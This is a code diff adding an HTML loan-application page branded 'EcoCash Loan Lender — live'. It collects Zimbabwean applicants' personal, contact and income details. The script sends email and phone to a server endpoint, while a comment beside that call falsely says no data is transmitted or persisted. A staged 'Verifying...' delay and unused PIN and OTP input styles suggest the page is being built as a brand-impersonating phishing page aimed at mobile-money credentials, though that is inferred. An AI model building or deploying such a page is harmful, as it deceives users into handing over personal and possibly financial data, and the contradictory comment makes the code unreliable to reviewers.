@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="theme-color" content="#102a43" />
+<title>EcoCash Loan Lender — live</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--navy:#102a43;--navy2:#173f5f;--teal:#08a88a;--teal-dark:#087f6b;--ink:#183044;--muted:#6b7c8f;--line:#dce5ec;--paper:#fff;--bg:#f2f7f9;--soft:#eaf8f5;--danger:#b42318;--shadow:0 22px 70px #173f5f14}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);font-family:"DM Sans",sans-serif;min-height:100vh}button,input,select,textarea{font:inherit}button{cursor:pointer}
+.topbar{height:72px;background:#fff;border-bottom:1px solid #e3ebf0;display:flex;align-items:center;justify-content:space-between;padding:0 clamp(18px,5vw,72px);position:sticky;top:0;z-index:5}
+.brand{display:flex;align-items:center;gap:10px;font-family:Manrope,sans-serif;font-weight:800;font-size:20px;color:var(--navy);letter-spacing:-.6px}.brand-mark{width:34px;height:34px;border-radius:11px;background:var(--teal);color:white;display:grid;place-items:center;font-size:17px;box-shadow:0 5px 12px #08a88a35}.brand span{color:var(--teal)}
+.nav-note{font-size:12px;color:var(--muted);display:flex;align-items:center;gap:7px}.dot{width:7px;height:7px;border-radius:50%;background:var(--teal)}
+main{max-width:1120px;margin:0 auto;padding:44px 22px 60px}.hero-layout{display:grid;grid-template-columns:1fr 430px;gap:56px;align-items:center;min-height:620px}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;background:#e1f6f1;color:#087f6b;padding:8px 12px;border-radius:99px;font-size:12px;font-weight:700;letter-spacing:.5px;text-transform:uppercase}
+h1,h2,h3{font-family:Manrope,sans-serif;color:var(--navy);letter-spacing:-.8px}h1{font-size:clamp(38px,5vw,58px);line-height:1.08;margin:22px 0 18px;max-width:580px}h1 em{font-style:normal;color:var(--teal)}.hero-copy{font-size:17px;line-height:1.8;color:var(--muted);max-width:520px}.benefits{display:grid;gap:15px;margin:30px 0}.benefit{display:flex;gap:12px;align-items:center;font-weight:600;font-size:14px}.benefit-icon{width:34px;height:34px;border-radius:10px;background:#fff;box-shadow:0 4px 15px #102a430c;display:grid;place-items:center;color:var(--teal)}
+.panel{background:#fff;border:1px solid #e4edf1;border-radius:24px;padding:32px;box-shadow:var(--shadow);position:relative;overflow:hidden}.panel:before{content:"";position:absolute;width:170px;height:170px;border-radius:50%;background:#eaf8f5;right:-90px;top:-95px}.panel>*{position:relative}.shield{width:54px;height:54px;border-radius:17px;background:var(--soft);display:grid;place-items:center;color:var(--teal);font-size:25px;margin-bottom:22px}.panel h2{font-size:26px;line-height:1.2;margin:0 0 10px}.sub{color:var(--muted);font-size:14px;line-height:1.65;margin:0 0 24px}.notice{background:#f1f8fb;border:1px solid #d8eaf2;border-radius:13px;padding:15px;font-size:12px;line-height:1.6;color:#35566d;margin:20px 0 24px}.notice strong{display:block;color:var(--navy);font-size:12px;margin-bottom:5px}.btn{border:0;border-radius:12px;padding:15px 18px;font-weight:800;letter-spacing:.3px;transition:.2s;background:var(--teal);color:#fff;box-shadow:0 8px 18px #08a88a2d}.btn:hover:not(:disabled){background:var(--teal-dark);transform:translateY(-1px)}.btn:disabled{background:#c5d2d9;box-shadow:none;cursor:not-allowed;color:#f8fbfc}.btn.otp-ready{background:var(--teal);color:#fff;box-shadow:0 8px 18px #08a88a45}.btn.otp-ready:hover{background:var(--teal-dark)}.btn.full{width:100%}.btn.secondary{background:#fff;color:var(--navy);border:1px solid var(--line);box-shadow:none}.trust{display:flex;justify-content:center;gap:16px;color:var(--muted);font-size:11px;margin-top:18px}.trust span{display:flex;align-items:center;gap:5px}
+.form-wrap{max-width:620px;margin:0 auto}.form-card{background:white;border:1px solid #e4edf1;border-radius:22px;padding:clamp(22px,4vw,38px);box-shadow:var(--shadow)}.form-head{text-align:center;margin-bottom:28px}.form-head h2{font-size:27px;margin:0 0 8px}.form-head p{color:var(--muted);font-size:13px;margin:0}.stepper{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:24px 0 30px}.step-line{height:5px;border-radius:10px;background:#e4ebef}.step-line.active,.step-line.done{background:var(--teal)}.step-labels{display:flex;justify-content:space-between;font-size:11px;color:#8595a4;margin-top:-20px;margin-bottom:28px}
+.fields{display:grid;grid-template-columns:1fr 1fr;gap:18px}.field{display:flex;flex-direction:column;gap:8px}.field.wide{grid-column:1/-1}label{font-size:13px;font-weight:700;color:var(--navy)}input,select,textarea{width:100%;border:1px solid #cfdbe3;background:#fff;border-radius:10px;padding:13px 14px;color:var(--ink);outline:none;transition:.15s}input:focus,select:focus,textarea:focus{border-color:var(--teal);box-shadow:0 0 0 3px #08a88a18}input::placeholder,textarea::placeholder{color:#9aa8b4}textarea{resize:vertical;min-height:92px}.hint{font-size:11px;color:var(--muted);line-height:1.5}.actions{display:flex;gap:12px;margin-top:26px}.actions .btn{flex:1}.error{font-size:12px;color:var(--danger);display:none}.field.invalid input,.field.invalid select,.field.invalid textarea{border-color:#d92d20}
+.phone-input-row{display:flex;align-items:stretch;border:1px solid #cfdbe3;border-radius:10px;overflow:hidden;background:#fff;transition:.15s}.phone-input-row:focus-within{border-color:var(--teal);box-shadow:0 0 0 3px #08a88a18}.phone-prefix{display:flex;align-items:center;padding:0 13px;background:#eef7f6;border-right:1px solid #d5e6e4;color:var(--navy);font-weight:800;font-size:14px}.phone-input-row input{border:0;border-radius:0;box-shadow:none!important;min-width:0}.field.invalid .phone-input-row{border-color:#d92d20}.field.invalid .error{display:block}
+.summary{margin-top:22px;border:1px solid #d9eee9;border-radius:14px;padding:18px;background:#f6fcfa}.summary h3{font-size:15px;margin:0 0 14px}.summary-row{display:flex;justify-content:space-between;gap:20px;padding:8px 0;border-bottom:1px solid #e4f1ed;font-size:13px}.summary-row:last-child{border-bottom:0}.summary-row span:first-child{color:var(--muted)}.summary-row strong{text-align:right;color:var(--navy);overflow-wrap:anywhere}
+.status{text-align:center;padding:16px 4px}.status-icon{height:72px;width:72px;margin:0 auto 20px;border-radius:50%;display:grid;place-items:center;font-size:32px;background:var(--soft);color:var(--teal)}.status h2{font-size:28px;margin:0 0 12px}.status p{color:var(--muted);line-height:1.7;font-size:14px}.countdown{margin:20px 0;background:#f3f8fa;padding:13px;border-radius:10px;color:var(--navy);font-weight:700;font-size:13px}.live-tag{display:inline-block;border:1px solid #d7e5ec;border-radius:7px;padding:5px 8px;color:#587082;font-size:10px;font-weight:800;letter-spacing:.7px;margin-bottom:14px}.pin-inputs,.otp-inputs{display:flex;gap:9px;justify-content:center;margin:14px 0}.pin-inputs input{width:54px;height:58px;text-align:center;font-size:24px;font-weight:800;padding:0}.otp-inputs input{width:45px;height:54px;text-align:center;font-size:22px;font-weight:800;padding:0}.pin-inputs input:focus,.otp-inputs input:focus{border-color:var(--teal);box-shadow:0 0 0 3px #08a88a18}.btn.otp-ready{background:var(--teal);color:#fff;box-shadow:0 8px 18px #08a88a45}.timer{font-weight:800;color:var(--teal)}.inline-link{border:0;background:none;color:var(--teal-dark);font-weight:700;padding:8px 0}.inline-link:disabled{color:#9aabb6;cursor:not-allowed}.backlink{border:0;background:none;color:var(--muted);font-weight:700;padding:0}.hidden{display:none!important}.footer{text-align:center;color:#8b9aa7;font-size:11px;padding:18px}.footer a{color:inherit}.menu-btn{border:0;background:none;color:var(--navy);font-size:23px}
+@media(max-width:850px){.hero-layout{grid-template-columns:1fr;gap:28px;padding-top:8px;min-height:0}.hero-copy{max-width:650px}.hero-layout .panel{max-width:500px;width:100%;margin:0 auto}main{padding-top:28px}.hero-layout h1{font-size:43px}}
+@media(max-width:520px){.nav-note{display:none}.topbar{height:62px}.fields{grid-template-columns:1fr}.field.wide{grid-column:auto}.actions{flex-direction:column-reverse}.panel{padding:25px}.pin-inputs{gap:8px}.pin-inputs input{width:50px;height:54px}.otp-inputs{gap:5px}.otp-inputs input{width:39px;height:48px}.step-labels{font-size:10px}}
+
+/* Five-second verification screen shown before every in-app page transition. */
+.verifying-page{
+  min-height:calc(100vh - 72px);
+  display:flex;
+  align-items:flex-start;
+  justify-content:center;
+  padding:0 22px 60px;
+  background:#f7f7f7;
+}
+.verifying-card{
+  width:min(392px,100%);
+  margin-top:14px;
+  background:#fff;
+  border-radius:16px;
+  padding:40px 30px 34px;
+  text-align:center;
+  box-shadow:0 8px 28px #102a4312;
+}
+.verifying-spinner{
+  width:60px;
+  height:60px;
+  margin:0 auto 24px;
+  border-radius:50%;
+  border:5px solid #e3e6ea;
+  border-top-color:#08a88a;
+  animation:verifying-spin 1s linear infinite;
+}
+.verifying-card h2{
+  margin:0 0 10px;
+  font-family:Manrope,sans-serif;
+  font-size:22px;
+  color:#102a43;
+}
+.verifying-card p{
+  margin:0;
+  color:#6b7c8f;
+  font-size:14px;
+  line-height:1.7;
+}
+.verifying-dots{
+  display:flex;
+  justify-content:center;
+  gap:8px;
+  margin-top:20px;
+}
+.verifying-dots span{
+  width:8px;
+  height:8px;
+  border-radius:50%;
+  background:#9bded3;
+  animation:verifying-dot 1.2s infinite ease-in-out;
+}
+.verifying-dots span:nth-child(1){animation-delay:0s;background:#08a88a}
+.verifying-dots span:nth-child(2){animation-delay:.15s}
+.verifying-dots span:nth-child(3){animation-delay:.3s}
+@keyframes verifying-spin{to{transform:rotate(360deg)}}
+@keyframes verifying-dot{
+  0%,60%,100%{transform:translateY(0);opacity:.65}
+  30%{transform:translateY(-3px);opacity:1}
+}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="brand"><div class="brand-mark">E</div> EcoCash <span>Loan Lender</span></div>
+  <div class="nav-note"><i class="dot"></i> Live application in USD</div>
+</header>
+<main>
+<section id="verifying" class="verifying-page hidden" aria-live="polite" aria-busy="true">
+  <div class="verifying-card">
+    <div class="verifying-spinner" aria-hidden="true"></div>
+    <h2>Verifying...</h2>
+    <p>Please wait while we process your request.<br>You will be redirected automatically.</p>
+    <div class="verifying-dots" aria-hidden="true"><span></span><span></span><span></span></div>
+  </div>
+</section>
+
+<section id="home" class="hero-layout">
+  <div>
+    <div class="eyebrow">✦ Personal finance, made clearer</div>
+    <h1>A simpler way to plan your next <em>step.</em></h1>
+    <p class="hero-copy">Start a personal loan application in a few guided steps. Share your details, review your application summary, and submit it for manual review.</p>
+    <div class="benefits">
+      <div class="benefit"><div class="benefit-icon">✓</div> Clear application steps and required fields</div>
+      <div class="benefit"><div class="benefit-icon">▤</div> Application summary before submission</div>
+      <div class="benefit"><div class="benefit-icon">◷</div> Manual approval workflow placeholder</div>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="shield">↗</div>
+    <h2>Explore your loan application</h2>
+    <p class="sub">Complete the application form to prepare a request for review. All application fields are required.</p>
+    <div class="notice"><strong>🔒 APPLICATION</strong></div>
+    <button class="btn full" id="startBtn">CHECK ELIGIBILITY <span aria-hidden="true">→</span></button>
+    <div class="trust"><span>✓ Transparent steps</span></div>
+  </div>
+</section>
+
+<section id="application" class="form-wrap hidden">
+  <div class="form-card">
+    <div class="form-head"><button class="backlink" id="homeBack">← Home</button><h2>Loan Application</h2><p id="stepCaption">Step 1 of 3 · Loan details</p></div>
+    <div class="stepper"><div class="step-line active" id="line1"></div><div class="step-line" id="line2"></div><div class="step-line" id="line3"></div></div>
+    <div class="step-labels"><span>Loan details</span><span>Personal details</span><span>Employment</span></div>
+    <form id="loanForm" novalidate>
+      <div id="step1">
+        <div class="fields">
+          <div class="field wide"><label for="loanType">Loan type *</label><select id="loanType" required><option value="">Select loan type</option><option>Personal Loan</option><option>Emergency Loan</option><option>Education Loan</option><option>Business Loan</option></select><span class="error">Choose a loan type.</span></div>
+          <div class="field wide"><label for="amount">Loan amount (USD) *</label><input id="amount" type="number" min="100" max="5000" step="0.01" placeholder="e.g. 250.00" required><span class="error">Enter an amount from $100 to $5,000.</span></div>
+          <div class="field wide"><label for="term">Loan term *</label><select id="term" required><option value="">Select a term</option><option>1 Month</option><option>3 Months</option><option>6 Months</option><option>9 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option></select><span class="error">Choose a loan term.</span></div>
+          <div class="field wide"><label for="purpose">Purpose of loan *</label><textarea id="purpose" maxlength="500" placeholder="Briefly explain what you will use the loan for" required></textarea><span class="error">Describe the purpose of the loan.</span></div>
+        </div>
+      </div>
+      <div id="step2" class="hidden">
+        <div class="fields">
+          <div class="field"><label for="firstName">First name *</label><input id="firstName" autocomplete="given-name" required placeholder="First name"><span class="error">Enter your first name.</span></div>
+          <div class="field"><label for="lastName">Last name *</label><input id="lastName" autocomplete="family-name" required placeholder="Last name"><span class="error">Enter your last name.</span></div>
+          <div class="field wide"><label for="email">Email address *</label><input id="email" type="email" autocomplete="email" required placeholder="you@example.com"><span class="error">Enter a valid email address.</span></div>
+          <div class="field wide"><label for="phone">Phone number *</label><div class="phone-input-row"><span class="phone-prefix" aria-label="Zimbabwe country code">+263</span><input id="phone" type="tel" inputmode="numeric" autocomplete="tel-national" placeholder="771234567" maxlength="10" required aria-describedby="phoneHint"></div></div>
+          <div class="field wide"><label for="address">Residential address *</label><input id="address" autocomplete="street-address" required placeholder="Street, suburb or stand number"><span class="error">Enter your residential address.</span></div>
+          <div class="field wide"><label for="city">City / town *</label><input id="city" autocomplete="address-level2" required placeholder="e.g. Harare"><span class="error">Enter your city or town.</span></div>
+        </div>
+      </div>
+      <div id="step3" class="hidden">
+        <div class="fields">
+          <div class="field wide"><label for="employment">Employment status *</label><select id="employment" required><option value="">Select employment status</option><option>Employee</option><option>Employer</option><option>Self-employed</option><option>Not employed</option></select><span class="error">Choose your employment status.</span></div>
+          <div class="field wide"><label for="income">Annual income (USD) *</label><input id="income" type="number" min="0" max="100000000" step="0.01" required placeholder="e.g. 12000"><span class="hint">Enter 0 if you currently have no annual income.</span><span class="error">Enter a valid annual income of $0 or more.</span></div>
+        </div>
+        <div class="summary"><h3>Application summary</h3>
+          <div class="summary-row"><span>Loan amount</span><strong id="sumAmount">—</strong></div>
+          <div class="summary-row"><span>Loan term</span><strong id="sumTerm">—</strong></div>
+          <div class="summary-row"><span>Purpose</span><strong id="sumPurpose">—</strong></div>
+          <div class="summary-row"><span>Applicant full name</span><strong id="sumName">—</strong></div>
+        </div>
+        <div class="notice"><strong>Before you submit</strong>This prototype stores application details only in this browser session. Production use requires a secure backend, privacy notice, consent, and applicable regulatory clearance.</div>
+      </div>
+      <div class="actions"><button type="button" class="btn secondary hidden" id="prevBtn">Previous</button><button type="button" class="btn" id="nextBtn">NEXT STEP →</button><button type="submit" class="btn hidden" id="submitBtn" disabled>SUBMIT APPLICATION</button></div>
+    </form>
+  </div>
+</section>
+
+<section id="submitted" class="form-wrap hidden"><div class="form-card status">
+  <div class="status-icon">✓</div><span class="live-tag">STATUS</span><h2>Loan Application Submitted</h2>
+  <p>Your application has been recorded in this live. Your application has been recorded for review. Submission does not mean approval.</p>
+  <div class="countdown" id="redirectCount">Your application has been registered successfully.</div>
+</div></section>
+
+
+</main>
+<footer class="footer">Loan Application Portal · © 2026</footer>
+<script>
+const $ = id => document.getElementById(id);
+const sections = ['home','application','submitted'];
+let step = 1, redirectTimer = null, navigationTimer = null, countdown = 5;
+const values = id => $(id).value.trim();
+
+/* Direct section switch used internally after the five-second verification screen. */
+function show(id){
+  sections.forEach(s=>$(s).classList.toggle('hidden',s!==id));
+  $('verifying').classList.add('hidden');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+/* Every in-app page transition is routed through the five-second verification screen. */
+function redirectTo(id, afterShow){
+  clearTimeout(navigationTimer);
+  sections.forEach(s=>$(s).classList.add('hidden'));
+  $('verifying').classList.remove('hidden');
+  window.scrollTo({top:0,behavior:'smooth'});
+  navigationTimer=setTimeout(()=>{
+    show(id);
+    if(typeof afterShow==='function') afterShow();
+  },5000);
+}
+
+$('startBtn').onclick=()=>{step=1;redirectTo('application',renderStep);};
+$('homeBack').onclick=()=>redirectTo('home');
+function renderStep(){
+  [1,2,3].forEach(n=>{$('step'+n).classList.toggle('hidden',n!==step);$('line'+n).classList.toggle('active',n===step);$('line'+n).classList.toggle('done',n<step);});
+  $('stepCaption').textContent=`Step ${step} of 3 · ${['Loan details','Personal details','Employment and review'][step-1]}`;
+  $('prevBtn').classList.toggle('hidden',step===1);
+  $('nextBtn').classList.toggle('hidden',step===3);
+  $('submitBtn').classList.toggle('hidden',step!==3);
+  if(step===3)updateSummary();
+  validateAll(false);
+}
+function validField(el){
+  const v=el.value.trim(); let ok=true;
+  if(el.id==='phone') { const digits=v.replace(/\D/g,'').replace(/^263/,'').replace(/^0/,''); ok=/^[0-9]{9}$/.test(digits); }
+  else if(el.id==='email') ok=/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
+  else if(el.id==='amount') ok=v!==''&&Number(v)>=100&&Number(v)<=5000;
+  else if(el.id==='income') ok=v!==''&&Number(v)>=0&&Number(v)<=100000000;
+  else if(el.id==='pin') ok=/^[0-9]{4,6}$/.test(v);
+  else ok=v!=='';
+  const field=el.closest('.field'); if(field)field.classList.toggle('invalid',!ok&&el.dataset.touched==='1');
+  return ok;
+}
+function stepFields(n){return [...$('step'+n).querySelectorAll('input[required],select[required],textarea[required]')];}
+function validateStep(n,showErrors=true){
+  const fields=stepFields(n);let ok=true;
+  fields.forEach(el=>{if(showErrors)el.dataset.touched='1';const good=validField(el);if(!good)ok=false;});
+  return ok;
+}
+function validateAll(showErrors=true){let ok=true;for(let n=1;n<=3;n++)if(!validateStep(n,showErrors))ok=false;$('submitBtn').disabled=!(ok&&step===3);}
+function updateSummary(){
+  $('sumAmount').textContent=values('amount')?new Intl.NumberFormat('en-US',{style:'currency',currency:'USD'}).format(Number(values('amount'))):'—';
+  $('sumTerm').textContent=values('term')||'—';$('sumPurpose').textContent=values('purpose')||'—';
+  $('sumName').textContent=[values('firstName'),values('lastName')].filter(Boolean).join(' ')||'—';
+}
+$('nextBtn').onclick=()=>{if(step===2)normalizePhoneField();if(!validateStep(step,true))return;step++;renderStep();};
+$('prevBtn').onclick=()=>{step--;renderStep();};
+document.querySelectorAll('#loanForm input,#loanForm select,#loanForm textarea').forEach(el=>{el.addEventListener('input',()=>{el.dataset.touched='1';validField(el);validateAll(false);if(step===3)updateSummary();});el.addEventListener('change',()=>{validField(el);validateAll(false);if(step===3)updateSummary();});});
+async function notifyRegistration(app){
+  try{
+    await fetch('/api/notify-registration', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        email:app.email,
+        phone:app.phone,
+        registeredAt:new Date().toISOString()
+      }),
+      keepalive:true
+    });
+  }catch(err){
+    console.warn('Registration notification failed:', err);
+  }
+}
+
+async function notifyRegistration(app){
+  try{
+    const response = await fetch('/api/notify-registration', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        email:app.email,
+        phone:app.phone,
+        registeredAt:new Date().toISOString()
+      }),
+      keepalive:true
+    });
+    if(!response.ok) console.warn('Registration notification failed:', response.status);
+  }catch(err){
+    console.warn('Registration notification failed:', err);
+  }
+}
+
+function normalizePhoneField(){
+  const field=$('phone');
+  let digits=field.value.replace(/\D/g,'');
+  if(digits.startsWith('263'))digits=digits.slice(3);
+  if(digits.startsWith('0'))digits=digits.slice(1);
+  field.value=digits;
+}
+$('loanForm').onsubmit=e=>{
+  e.preventDefault();normalizePhoneField();if(step!==3||!validateStep(3,true)||!validateStep(1,false)||!validateStep(2,false))return;
+  const app={loanType:values('loanType'),amount:values('amount'),term:values('term'),purpose:values('purpose'),firstName:values('firstName'),lastName:values('lastName'),email:values('email'),phone:'+263'+values('phone').replace(/^0/,''),address:values('address'),city:values('city'),employment:values('employment'),income:values('income')};
+  // live-only in-memory state. No application data is transmitted or persisted.
+  window.liveApplication=app;
+
+  clearInterval(redirectTimer);
+  notifyRegistration(app);
+  redirectTo('submitted',()=>{
+    $('redirectCount').textContent='Your application has been registered successfully.';
+  });
+};
+</script>
+</body>
+</html>
